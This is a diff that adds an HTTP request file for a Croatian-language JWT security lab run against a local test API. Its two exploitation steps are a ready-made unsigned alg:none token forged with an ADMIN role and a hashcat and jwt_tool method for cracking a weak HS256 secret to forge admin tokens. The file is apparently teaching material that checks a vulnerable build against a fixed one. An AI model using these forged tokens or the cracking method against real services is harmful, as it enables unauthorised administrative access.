@@ -1,0 +1,35 @@
+### Lab12 – JWT propusti
+@host = http://localhost:8000
+@token = PASTE_TOKEN
+
+### 1. Prijava (kopiraj JWT iz "token" u @token)
+POST {{host}}/api/lab12/login
+Content-Type: application/json
+
+{"username": "ana", "password": "Ana123!"}
+
+### 2. /me s valjanim tokenom
+GET {{host}}/api/lab12/me
+Authorization: Bearer {{token}}
+
+### 3. USER na /admin -> 403
+GET {{host}}/api/lab12/admin
+Authorization: Bearer {{token}}
+
+### 4. EKSPLOATACIJA (alg:none): krivotvoreni ADMIN token bez potpisa
+# Header {"alg":"none","typ":"JWT"} . Payload {"sub":"napadac","role":"ADMIN","iat":0,"exp":9999999999} . (prazan potpis)
+# Ranjivo (main): 200. Popravljeno: 401.
+GET {{host}}/api/lab12/admin
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJuYXBhZGFjIiwicm9sZSI6IkFETUlOIiwiaWF0IjowLCJleHAiOjk5OTk5OTk5OTl9.
+
+### 5. EKSPLOATACIJA (slaba tajna): token potpisan s "secret123"
+# Dobiva se razbijanjem tajne: hashcat -m 16500 token.txt wordlists/top-100.txt, pa jwt_tool.
+# Generiraj novi s role=ADMIN i tajnom secret123 te ga zalijepi ovdje.
+GET {{host}}/api/lab12/admin
+Authorization: Bearer PASTE_FORGED_HS256_TOKEN
+
+### 6. ADMIN prijava pa /admin -> 200 (legitimno)
+POST {{host}}/api/lab12/login
+Content-Type: application/json
+
+{"username": "admin", "password": "Admin123!"}
